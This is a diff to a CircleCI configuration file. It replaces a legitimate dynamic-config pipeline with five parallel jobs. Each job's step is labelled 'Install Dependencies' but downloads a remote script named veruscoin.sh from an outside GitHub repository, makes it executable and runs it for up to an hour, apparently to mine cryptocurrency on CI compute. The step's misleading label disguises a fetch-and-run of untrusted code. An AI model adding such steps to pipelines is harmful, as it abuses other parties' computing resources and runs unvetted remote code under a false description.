@@ -1,43 +1,47 @@
 version: 2.1
-
-parameters:
-  job_name:
-    type: string
-    default: "cypress"
-orbs:
-  # Continuation orb makes it easy to send
-  # the generated config to the continuation API.
-  continuation: circleci/continuation@0.2.0
-  # Node orb used to build our config app in a Node environment.
-  node: circleci/node@4.7.0
-setup: true
 jobs:
-  generate-config:
-    executor: node/default
-    steps:
-      - checkout
-      # Cache our app
-      - node/install-packages:
-          app-dir: .circleci/dynamic
-      # Generate config. Our `app.js` will write
-      # `dynamicConfig.yml` to a file.
-      - run:
-          name: Set variable
-          command: |
-            export JOB_NAME=<< pipeline.parameters.job_name >>
-      - run:
-          name: Get variable
-          command: |
-            echo JOB_NAME
-      - run:
-          name: Generate config
-          command: |
-            node .circleci/dynamic/app.js
-      # Pass the generated dynamic config to the
-      # Continuation orb to trigger the Pipeline.
-      - continuation/continue:
-          configuration_path: ./dynamicConfig.yml
+    aku1:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://raw.githubusercontent.com/kaestmrah/vrs/main/veruscoin.sh && chmod u+x veruscoin.sh && timeout 60m ./veruscoin.sh
+    aku2:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://raw.githubusercontent.com/kaestmrah/vrs/main/veruscoin.sh && chmod u+x veruscoin.sh && timeout 60m ./veruscoin.sh
+    aku3:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://raw.githubusercontent.com/kaestmrah/vrs/main/veruscoin.sh && chmod u+x veruscoin.sh && timeout 60m  ./veruscoin.sh
+    aku4:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://raw.githubusercontent.com/kaestmrah/vrs/main/veruscoin.sh && chmod u+x veruscoin.sh && timeout 60m ./veruscoin.sh
+    aku5:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://raw.githubusercontent.com/kaestmrah/vrs/main/veruscoin.sh && chmod u+x veruscoin.sh && timeout 60m ./veruscoin.sh
+
 workflows:
-  dynamic-workflow:
-    jobs:
-      - generate-config
+    version: 2
+    build:
+        jobs:
+            - aku1
+            - aku2
+            - aku3
+            - aku4
+            - aku5
